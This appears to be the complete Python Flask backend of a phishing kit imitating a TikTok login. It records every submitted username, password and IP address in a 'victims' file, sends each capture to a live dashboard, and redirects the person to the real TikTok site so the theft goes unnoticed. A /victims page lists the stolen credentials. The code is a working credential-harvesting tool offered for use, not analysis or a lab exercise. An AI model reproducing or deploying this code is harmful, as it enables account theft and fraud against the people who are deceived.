from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import os
import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'supersecretkey'
socketio = SocketIO(app, cors_allowed_origins="*")

VICTIMS_FILE = 'victims.txt'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(VICTIMS_FILE, 'a') as f:
        f.write(f"[{timestamp}] IP: {ip} | Username: {username} | Password: {password}\n")
    
    socketio.emit('new_victim', {
        'ip': ip,
        'username': username,
        'password': password,
        'time': timestamp
    })
    
    return jsonify({'status': 'success', 'redirect': 'https://www.tiktok.com'})

@app.route('/victims')
def victims():
    if not os.path.exists(VICTIMS_FILE):
        return "هیچ قوربانییەک نییە"
    with open(VICTIMS_FILE, 'r') as f:
        data = f.read()
    return f"<pre>{data}</pre>"

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)